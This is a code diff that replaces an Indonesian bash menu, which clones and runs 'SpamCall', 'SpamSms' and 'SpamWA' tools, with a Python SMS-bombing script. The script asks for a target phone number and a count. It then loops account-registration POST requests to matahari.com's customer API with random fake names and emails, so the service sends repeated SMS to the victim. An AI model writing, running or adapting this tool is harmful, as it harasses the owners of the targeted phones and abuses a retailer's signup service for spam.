@@ -1,109 +1,99 @@
-#!/usr/bin/bash
 
-#warna                                                                                              >
 
-merah="\033[31m"
+try:    # Janggan di ubah
+        import time,sys,os,json,requests,random
+except ModuleNotFoundError:
+         print ('[!] Install Modul Requests')
+         os.system('pip install requests')
 
-hijau="\033[32m"
+try:    # Janggan di ubah
+        ip = requests.get('https://api.ipify.org').text
+except requests.exceptions.ConnectionError:
+        exit(' [!] Koneksi Internet Error')
 
-kuning="\033[1;33m"
+# Janggan di ubah
+Email = random.choice(['lavon.lockman@gmail.com','duane_mclaughlin38@gmail.com','alfreda.lindgren@gmail.com','leonardo_kuhlman@gmail.com','lyric51@gmail.com','devonte_littel@gmail.com','newell.kuhic@gmail.com'])
+# Janggan di ubah
+Name = random.choice(["Halo Penipu","Halo Kawan","Halo Sayang","Halo Janda","Halo Ripper"])
 
-biru="\033[34m"
+a,m,h,k,b,u,c,p,bn,o = [
+'\033[90m',
+'\033[31m',
+'\033[32m',
+'\033[33m',
+'\033[94m',
+'\033[35m',
+'\033[36m',
+'\033[37m',
+'\033[41m',
+'\033[0m'
+]
 
-merahmuda="\33[35m"
+import os
 
-birumuda="\33[1;36m"
+# Di ubah sesuai kalian 
+# Subscribe dulu :)
+os.system("clear")
+banner= """
+\033[37m   _____                      \033[35m    _____
+\033[37m  / ___/____  ____ _____ ___  \033[35m   / ___/____ ___  _____
+\033[37m  \__ \/ __ \/ __ `/ __ `__ \ \033[35m   \__ \/ __ `__ \/ ___/
+\033[37m ___/ / /_/ / /_/ / / / / / / \033[35m  ___/ / / / / / (__  )
+\033[37m/____/ .___/\__,_/_/ /_/ /_/  \033[35m /____/_/ /_/ /_/____/
+\033[37m    /_/ \033[32m( \033[37mSpam Sms \033[33mMatahari \033[32m| \033[37mBY \033[33mXenzi-Xni \033[32m) \033[32m(\033[37mV.1\033[32m)
+\033[32m[•]───────────────────────────────────────────[•]
+\033[32m | [+]  Author  : Demon 		       |
+\033[32m | [+]  Tambahan:\033[90m Demonzx		       |
+\033[32m | [+]  TEAM    : CYBER HUNTER            |
+\033[32m[•]───────────────────────────────────────────[•]"""
+os.system('clear')
+print (banner)
+print ('%s[%s+%s] %sIP Kamu %s: %s%s' % (p,h,p,k,m,h,ip))
+no = input('\n\033[37m[\033[33m•\033[37m] \033[33mex \033[31m: \033[32m08xx\n\033[37m[\033[32m+\033[37m] \033[33mPhone\033[31m:\033[32m ')
+if no =='':
+   exit('\033[37m[\033[31m!\033[37m] don't be empty ')
+elif len(no) <= 9:
+   exit('\033[37m[\033[31m!\033[37m] invalid number ')
+else:
+   jml = int(input('\n\033[37m[\033[32m+\033[37m] \033[33mJumlah\033[31m:\033[32m '))
 
-putih="\033[37m"
+# Janggan di ubah
+heder = {'Host': 'www.matahari.com',
+           'content-length': '240',
+           'origin': 'https://www.matahari.com',
+           'x-newrelic-id': 'Vg4GVFVXDxAGVVlVBgcGVlY=',
+           'content-type': 'application/json',
+           'accept': '*/*',
+           'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
+           'save-data': 'on',
+           'sec-fetch-site': 'same-origin',
+           'sec-fetch-mode': 'cors',
+           'sec-fetch-dest': 'empty',
+           'referer': 'https://www.matahari.com/customer/account/create/',
+           'accept-encoding': 'gzip, deflate, br',
+           'accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
 
-menu() {
+# Janggan di ubah
+data = {
+	"thor_customer": {
+		"name": Name,
+		"email_address": Email,
+		"mobile_country_code": "+62",
+		"gender_id": "1",
+		"mobile_number": no,
+		"mro": "",
+		"password": "Wadepak1037",
+		"birth_date": "04/02/2022"
+		}
+	}
 
-clear
-
-   echo
-
-   echo -e "\033[31m$(figlet -f Remo773 "Sahur Spam")\e[0m"
-
-   echo
-
-   echo -e $kuning" ╔═══════════════════════════════════════════════╗"
-
-   echo -e $kuning" ║"   "\033[1;36mAuther    : MisterAM                "$kuning"    ║"
-
-   echo -e $kuning" ║"   "\033[1;36mTeam      : Dark Cyber                    "$kuning"    ║"
-
-   echo -e $kuning" ║"   "\033[1;36mChanel YT : MisterAM                      "$kuning"    ║"
-
-   echo -e $kuning" ║"   "\033[1;36mGithub    : https://github.com/Mister-AM  "$kuning"    ║"
-
-   echo -e $kuning" ╚═══════════════════════════════════════════════╝"
-
-   echo -e $putih "╔════════════════════════╗"
-
-   echo -e " ║ " "\033[1;31m  Tools Sahur Spam" $putih "  ║"
-
-   echo -e $putih "╚════════════════════════╝"
-
-   echo
-
-   echo -e $kuning "[1]""  SpamCall" $hijau "   [aktif]"
-
-   echo -e $kuning "[2]""  SpamSms" $hijau "    [aktif]"
-
-   echo -e $kuning "[3]""  SpamWA" $hijau "     [aktif]"
-
-   echo -e $kuning "[4]" $merah" Keluar/Exit"
-
-   echo
-
-   mainmenu
-
-}
-
-mainmenu() {
-
-    echo -e -n "\033[1;36mPilih ngab = ";read pil
-
-    if [ $pil == "1" ];then
-
-    git clone https://github.com/Mister-AM/Call
-
-    cd Call
-
-    python Call.py
-
-    echo "[√] SpamCall berhasil"
-
-    elif [ $pil == "2" ];then
-
-    git clone https://github.com/Mister-AM/bom_spam
-
-    cd bom_spam
-
-    python bom.py
-
-    echo "[√] SpamSms berhasil"
-
-    elif [ $pil == "3" ];then
-
-    git clone https://github.com/Mister-AM/spam_wa
-
-    cd spam_wa
-
-    python spam_wa.py
-
-    echo "[√] SpamWA berhasil di jalankan"
-
-    elif [ $pil == "4" ];then
-
-    exit
-
-    else
-
-    echo "[!] Masukin nomer yg bener ngab"
-
-    fi
-
-}
-
-menu
+print("\n\033[37m[\033[31m!\033[37m] \033[32mMessage ..\n")
+for i in range(jml):
+      # Janggan di ubah
+      sec = requests.post('https://www.matahari.com/rest/V1/thorCustomers', headers=heder, json=data)
+      if 'Success' in sec.text:
+           print(f'\033[37m[\033[35m{i+1}\033[37m] \033[33mMessage \033[31m: \033[31mSpam Succses')
+      else:
+           print(f'\033[37m[\033[35m{i+1}\033[37m] \033[33mMessage \033[31m: \033[31mSpam failed')
+      time.sleep(1.5)
+print ('\n\033[37m[\033[32m√\033[37m] \033[37mSpam Selesai \033[33m:)')
